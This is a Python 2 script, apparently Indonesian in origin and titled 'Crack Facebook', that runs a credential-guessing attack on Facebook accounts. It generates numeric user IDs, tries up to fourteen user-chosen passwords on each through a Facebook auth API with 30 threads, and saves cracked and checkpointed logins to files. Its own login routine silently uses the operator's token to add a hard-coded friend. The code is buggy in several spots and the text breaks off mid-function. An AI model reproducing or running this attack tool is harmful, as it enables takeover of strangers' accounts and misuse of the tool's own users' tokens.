#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(100):

    nmbr = random.randint(11111111, 99999999)
    num = random.randint(11, 99)
    mk = random.randint(11111, 99999)
    nb = random.randint(1111111, 9999999)
    sys.stdout = open('...txt', 'a')
    print(nmbr)
    print(num)
    print(mk)
    print(nb)
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 upil.py')


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(100):

    nmbr = random.randint(1111, 9999)
    numr = random.randint(0, 99)
    ang = random.randint(111, 999)
    sys.stdout = open('..txt', 'a')
    print(nmbr)
    print(numr)
    print(ang)
    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 upil.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 9; Infinix X652B Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 [FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171848;FBDM/{density=2.0,width=720,height=1428};FBLC/en_US;FBRV/243389251;FBCR/Warid;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X652B;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Selamat Tinggal '
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)


##### LOGO #####
logo = """\033[1;93m_/﹋\_          
\033[1;34m(🌀🌀)\033[0m
\033[1;36m<,︻╦╤─ ҉ ------------\033[0m \033[1;93m*Crack Facebook*\033[0m
\033[1;36m_/﹋\_\033[0m
\033[1;31m╔════════════════════════════════════════╗
\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mUPIL FACEBOOK \033[0m               \033[1;31m║
\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/aryhas\033[0m    \033[1;31m║
\033[1;31m╚════════════════════════════════════════╝\033[0m"""


def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mMohon Tunggu \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
threads = []
gagal = []
idlist = []
cekpoint = []
oks = []
cp = []
id = []
cpb = []
threads = []
sucessful = []
checkpoint = []
cp = []
ok = []
br.addheaders = []

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print
	print 42*"\033[1;96m="
	print "\033[1;96m[1] \033[1;93mCrack FB \033[1;93mEmail \033[1;93mTanpa login fb  "
	time.sleep(0.05)
	print "\033[1;96m[2] \033[1;93mCrack FB \033[1;93mUser Name \033[1;93mTanpa login fb  "
	time.sleep(0.05)
	print "\033[1;96m[3] \033[1;93mCrack FB \033[1;93mUser ID \033[1;93mTanpa login fb  "
	time.sleep(0.05)
	print "\033[1;96m[4] \033[1;93mLogin Akun Facebook  "
        time.sleep(0.05)
        print "\033[1;96m[5] \033[1;93mLogin Akun Facebook Pakai Acces token "
	time.sleep(0.05)
	print "\033[1;96m[0] \033[1;97mKeluar        "
	print 42*"\033[1;96m="
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;92mPilih Nomor \033[1;95m : ")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		crack_email()
	elif peak =="2":
		crack_nam()
	elif peak =="3":
		crack_ident()
	elif peak =="4":
		login1()
        elif peak =="5":
	        tokenz()
	elif unikers =="0":
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
		
	
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo
		jalan('\033[1;96m[!] \x1b[1;34mJangan Menggunakan akun fb lama' )
		jalan('\033[1;96m[!] \x1b[1;34mGunakan akun baru/via token' )
		print 42*"\033[1;96m="
		id = raw_input('\033[1;96m[!] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[!] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
		print 42*"\033[1;96m="
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				jalan( '\n\x1b[1;95mLogin Successful...') 
				os.system('xdg-open https://www.facebook.com/dogukan.er.144')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mSepertinya Akun Anda Terkena Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email Anda Salah")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()

def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;96m[+] \033[1;93mToken Facebook \033[1;91m: ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		jalan( '\n\x1b[1;93mLogin Berhasil.....') 
		os.system('xdg-open https://m.facebook.com/dogukan.er.144')
		requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+toket)
		menu()
	except KeyError:
		print "\033[1;96m[!] \033[1;31mSalah"


def crack_nam():
    os.system('clear')
    print logo
    print "\033[1;96m    \033[1;93m◆\033[1;31m ⃟ ⃟ \033[1;34m░▒▓ \033[1;93mCRACK USERNAME FB \033[1;34m▓▒░\033[1;31m ⃟ ⃟ \033[1;93m◆     \033[1;96m"
    print
    print 42*"\033[1;96m="
    try:
            print '\033[1;96m[+] \033[1;93mContoh : \033[1;97mupil. \033[1;97mupil.pilek. \033[1;97mdll'
            c = raw_input('\033[1;96m[+] \x1b[1;93mUsername : \033[1;31m ')
            print '\033[1;96m[+] \033[1;93mContoh : \033[1;97mupil123'
            pass1 = raw_input('\033[1;96m[1] \033[1;93mPassword : \033[1;31m ')
            pass2 = raw_input('\033[1;96m[2] \033[1;93mPassword : \033[1;31m ')
            pass3 = raw_input('\033[1;96m[3] \033[1;93mPassword : \033[1;31m ')
            pass4 = raw_input('\033[1;96m[4] \033[1;93mPassword : \033[1;31m ')
            pass5 = raw_input('\033[1;96m[5] \033[1;93mPassword : \033[1;31m ')
            pass6 = raw_input('\033[1;96m[6] \033[1;93mPassword : \033[1;31m ')
            pass7 = raw_input('\033[1;96m[7] \033[1;93mPassword : \033[1;31m ')        
            idlist = '..txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

            print 42*"\033[1;96m="
            m = raw_input('\033[1;96m[+] \x1b[1;93mUsername : \033[1;31m ')
            print '\033[1;96m[+] \033[1;93mContoh : \033[1;97mupil123'
            pass8 = raw_input('\033[1;96m[1] \033[1;93mPassword : \033[1;31m ')
            pass9 = raw_input('\033[1;96m[2] \033[1;93mPassword : \033[1;31m ')
            pass10 = raw_input('\033[1;96m[3] \033[1;93mPassword : \033[1;31m ')
            pass11 = raw_input('\033[1;96m[4] \033[1;93mPassword : \033[1;31m ')
            pass12 = raw_input('\033[1;96m[5] \033[1;93mPassword : \033[1;31m ')
            pass13 = raw_input('\033[1;96m[6] \033[1;93mPassword : \033[1;31m ')
            pass14 = raw_input('\033[1;96m[7] \033[1;93mPassword : \033[1;31m ')        
            idlist = '..txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

    except IOError:
        print '[!] Ora Ono '
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\033[1;96m[+] \x1b[1;93mTotal user name \x1b[1;97m:\x1b[1;97m ' + xxx)
    login = 'https://www.facebook.com/login.php?login_attempt=1'
    time.sleep(1)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\033[1;96m[+] \033[1;93mProses Sedang Berlangsung ' + o,
        sys.stdout.flush()
        time.sleep(1)
    print
    print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
    print 42*"\033[1;96m="
    print "\033[96m| 😎 | " + 4*" " + "\033[35mUSER NAME" + 7*" " + "\033[96m|" + 4*" " + "\033[33mPassword" + 3*" " + "\033[96m"
    print 42*"\033[1;96m="


    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'acces_token' in w:
                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass1
                okb = open('save/usernam.txt', 'a')
                okb.write('[OK] ' + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'wwww.facebook.com' in w['error_msg']:
                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass1
                cps = open('save/usernam.txt', 'a')
                cps.write('[CP] ' + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'acces_token' in w:
                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass2
                    okb = open('save/usernam.txt', 'a')
                    okb.write('[OK] ' + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass2
                    cps = open('save/usernam.txt', 'a')
                    cps.write('[CP] ' + c + user + ' | ' + pass2 + '\n')
                    cps.close()
                    cekpoint.append(user + pass2)
                else:
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'acces_token' in w:
                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass3
                        okb = open('save/usernam.txt', 'a')
                        okb.write('[CP] ' + c + user + ' | ' + pass3 + '\n')
                        okb.close()
                        oks.append(user + pass3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass3
                        cps = open('save/usernam.txt', 'a')
                        cps.write('[CP] ' + c + user + ' | ' + pass3 + '\n')
                        cps.close()
                        cekpoint.append(user + pass3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'acces_token' in w:
                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass4
                            okb = open('save/usernam.txt', 'a')
                            okb.write('[OK] ' + c + user + ' | ' + pass4 + '\n')
                            okb.close()
                            oks.append(user + pass4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass4
                            cps = open('save/usernam.txt', 'a')
                            cps.write('[CP] ' + c + user + ' | ' + pass4 + '\n')
                            cps.close()
                            cekpoint.append(user + pass4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'acces_token' in w:
                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass5
                                okb = open('save/usernam.txt', 'a')
                                okb.write('[OK]' + c + user + ' | ' + pass5 + '\n')
                                okb.close()
                                oks.append(user + pass5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass5
                                cps.open('save/usernam.txt', 'a')
                                cps.write('[CP]' + c + user + ' | ' + pass5 + '\n')
                                cps.close()
                                cekpoint.append(user + pass5)
                            else:
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                w = json.load(data)
                                if 'acces_token' in w:
                                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass6
                                    okb = open('save/email.txt', 'a')
                                    okb.write('[OK] ' + c + user + ' | ' + pass6 + '\n')
                                    okb.close()
                                    oks.append(user + pass6)
                                elif 'www.facebook.com' in w['error_msg']:
                                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass6
                                    cps = open('save/email.txt', 'a')
                                    cps.write('[CP] ' + c + user + ' | ' + pass6 + '\n')
                                    cps.close()
                                    cekpoint.append(user + pass6)
                                else:
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    w = json.load(data)
                                    if 'mbasic.facebook.com' in w:
                                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass7
                                        okb = open('save/email.txt', 'a')
                                        okb.write('[OK]' + c + user + ' | ' + pass7 + '\n')
                                        okb.close()
                                        oks.append(user + pass7)
                                    elif 'acces_token' in w['error_msg']:
                                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass7
                                        cps.open('save/email.txt', 'a')
                                        cps.write('[CP]' + c + user + ' | ' + pass7 + '\n')
                                        cps.close()
                                        cekpoint.append(user + pass7)
                                    else:
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        w = json.load(data)
                                        if 'mbasic.facebook.com' in w:
                                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass8
                                            okb = open('save/userid.txt', 'a')
                                            okb.write('[CP] ' + m + user + ' | ' + pass8 + '\n')
                                            okb.close()
                                            oks.append(user + pass8)
                                        elif 'acces_token' in w['error_msg']:
                                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass8
                                            cps = open('save/userid.txt', 'a')
                                            cps.write('[CP] ' + m + user + ' | ' + pass8 + '\n')
                                            cps.close()
                                            cekpoint.append(user + pass8)
                                        else:
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            w = json.load(data)
                                            if 'mbasic.facebook.com' in w:
                                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass9
                                                okb = open('save/userid.txt', 'a')
                                                okb.write('[OK] ' + m + user + ' | ' + pass9 + '\n')
                                                okb.close()
                                                oks.append(user + pass9)
                                            elif 'www.facebook.com' in w['error_msg']:
                                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass9
                                                cps = open('save/userid.txt', 'a')
                                                cps.write('[CP] ' + m + user + ' | ' + pass9 + '\n')
                                                cps.close()
                                                cekpoint.append(user + pass9)
                                            else:
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                w = json.load(data)
                                                if 'acces_token' in w:
                                                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass10
                                                    okb = open('save/userid.txt', 'a')
                                                    okb.write('[OK]' + m + user + ' | ' + pass10 + '\n')
                                                    okb.close()
                                                    oks.append(user + pass10)
                                                elif 'www.facebook.com' in w['error_msg']:
                                                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass10
                                                    cps.open('save/userid.txt', 'a')
                                                    cps.write('[CP]' + m + user + ' | ' + pass10 + '\n')
                                                    cps.close()
                                                    cekpoint.append(user + pass10)
                                                else:
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    w = json.load(data)
                                                    if 'acces_token' in w:
                                                        print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass11
                                                        okb = open('save/userid.txt', 'a')
                                                        okb.write('[CP] ' + m + user + ' | ' + pass11 + '\n')
                                                        okb.close()
                                                        oks.append(user + pass11)
                                                    elif 'www.facebook.com' in w['error_msg']:
                                                        print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass11
                                                        cps = open('save/userid.txt', 'a')
                                                        cps.write('[CP] ' + m + user + ' | ' + pass11 + '\n')
                                                        cps.close()
                                                        cekpoint.append(user + pass11)
                                                    else:
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        w = json.load(data)
                                                        if 'acces_token' in w:
                                                            print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass12
                                                            okb = open('save/userid.txt', 'a')
                                                            okb.write('[OK] ' + m + user + ' | ' + pass12 + '\n')
                                                            okb.close()
                                                            oks.append(user + pass12)
                                                        elif 'www.facebook.com' in w['error_msg']:
                                                            print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass12
                                                            cps = open('save/userid.txt', 'a')
                                                            cps.write('[CP] ' + m + user + ' | ' + pass12 + '\n')
                                                            cps.close()
                                                            cekpoint.append(user + pass12)
                                                        else:
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            w = json.load(data)
                                                            if 'acces_token' in w:
                                                                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass13
                                                                okb = open('save/userid.txt', 'a')
                                                                okb.write('[OK]' + m + user + ' | ' + pass13 + '\n')
                                                                okb.close()
                                                                oks.append(user + pass13)
                                                            elif 'www.facebook.com' in w['error_msg']:
                                                                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass13
                                                                cps.open('save/userid.txt', 'a')
                                                                cps.write('[CP]' + m + user + ' | ' + pass13 + '\n')
                                                                cps.close()
                                                                cekpoint.append(user + pass13)
                                                            else:
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                w = json.load(data)
                                                                if 'acces_token' in w:
                                                                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass14
                                                                    okb = open('save/userid.txt', 'a')
                                                                    okb.write('[OK]' + m + user + ' | ' + pass14 + '\n')
                                                                    okb.close()
                                                                    oks.append(user + pass14)
                                                                elif 'www.facebook.com' in w['error_msg']:
                                                                    print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass14
                                                                    cps.open('save/userid.txt', 'a')
                                                                    cps.write('[CP]' + m + user + ' | ' + pass14 + '\n')
                                                                    cps.close()
                                                                    cekpoint.append(user + pass14)

        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42*"\033[1;96m="
    print '\033[1;96m[✓] \x1b[1;93mCrack Selesai ....'
    print '\033[1;96m[✓] \x1b[1;93mTotal \x1b[1;34mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;34m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\033[1;96m[✓] \x1b[1;97mCP/OK tersimpan : save/usernam.txt'
    print 42*"\033[1;96m="
    raw_input('\x1b[1;97m[\x1b[1;92m KEMBALI \x1b[1;97m]')
    os.system('python2 upil.py')



def crack_ident():
    os.system('clear')
    print logo
    print "\033[1;96m    \033[1;93m◆\033[1;31m ⃟ ⃟ \033[1;34m░▒▓ \033[1;93mCRACK IDENTITAS FB \033[1;34m▓▒░\033[1;31m ⃟ ⃟ \033[1;93m◆     \033[1;96m"
    print
    print 42*"\033[1;96m="
    try:
        print '\033[1;96m[+] \033[1;93mContoh ID : \033[1;97m 1000001 1000002 10 15 dll'
        print '\033[1;96m[+] \033[1;97mKHUSUS 15digit & 10digit'
        c = raw_input('\033[1;96m[+] \x1b[1;93mID Depan : \033[1;31m ')
        print '\033[1;96m[+] \033[1;93mContoh password : \033[1;97msayang jembot dst'
        pass1 = raw_input('\033[1;96m[1] \033[1;93mPassword : \033[1;31m ')
        pass2 = raw_input('\033[1;96m[2] \033[1;93mPassword : \033[1;31m ')
        pass3 = raw_input('\033[1;96m[3] \033[1;93mPassword : \033[1;31m ')
        pass4 = raw_input('\033[1;96m[4] \033[1;93mPassword : \033[1;31m ')
        pass5 = raw_input('\033[1;96m[5] \033[1;93mPassword : \033[1;31m ')
        idlist = '...txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

        print 42*"\033[1;96m="
        print '\033[1;96m[+] \033[1;93mContoh ID : \033[1;97m 10 11 14 15 50 60 70 dll'
        print '\033[1;96m[+] \033[1;97mKHUSUS 9digit kebawah'
        m = raw_input('\033[1;96m[+] \x1b[1;93mID Depan : \033[1;31m ')
        print '\033[1;96m[+] \033[1;93mContoh password : \033[1;97msayang jembot dst'
        pass6 = raw_input('\033[1;96m[1] \033[1;93mPassword : \033[1;31m ')
        pass7 = raw_input('\033[1;96m[2] \033[1;93mPassword : \033[1;31m ')
        pass8 = raw_input('\033[1;96m[3] \033[1;93mPassword : \033[1;31m ')
        pass9 = raw_input('\033[1;96m[4] \033[1;93mPassword : \033[1;31m ')
        pass10 = raw_input('\033[1;96m[5] \033[1;93mPassword : \033[1;31m ')
        idlist = '...txt'
        for line in open(idlist, 'r').readlines():
            id.append(line.strip())

    except IOError:
        print '[!] Ora Ono '
        raw_input('\n[ Kembali ]')
        menu()

    xxx = str(len(id))
    jalan('\033[1;96m[+] \x1b[1;93mTotal ID \x1b[1;97m:\x1b[1;97m ' + xxx)
    time.sleep(1)
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\033[1;96m[+] \033[1;93mProses Sedang Berlangsung ' + o,
        sys.stdout.flush()
        time.sleep(1)
    print
    print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
    print('\x1b[1;96m[!] \x1b[1;97mJangan Di Coba Krn masih sulit')
    print 42*"\033[1;96m="
    print "\033[96m| 😎 | " + 3*" " + "\033[35mIdentitas" + 4*" " + "\033[96m" + 5*" " + "\033[33mPassword" + 8*" " + "\033[96m"
    print 42*"\033[1;96m="


    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c +  user +  ' | '  +  pass1
                okb = open('save/userid.txt', 'a')
                okb.write('[OK] ' + c + user + ' | ' + pass1 + '\n')
                okb.close()
                oks.append(user + pass1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass1
                cps = open('save/userid.txt', 'a')
                cps.write('[CP] ' + c + user + ' | ' + pass1 + '\n')
                cps.close()
                cekpoint.append(user + pass1)
            else:
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass2
                    okb = open('save/userid.txt', 'a')
                    okb.write('[OK] ' + c + user + ' | ' + pass2 + '\n')
                    okb.close()
                    oks.append(user + pass2)
                elif 'www.facebook.com' in w['error_msg']:
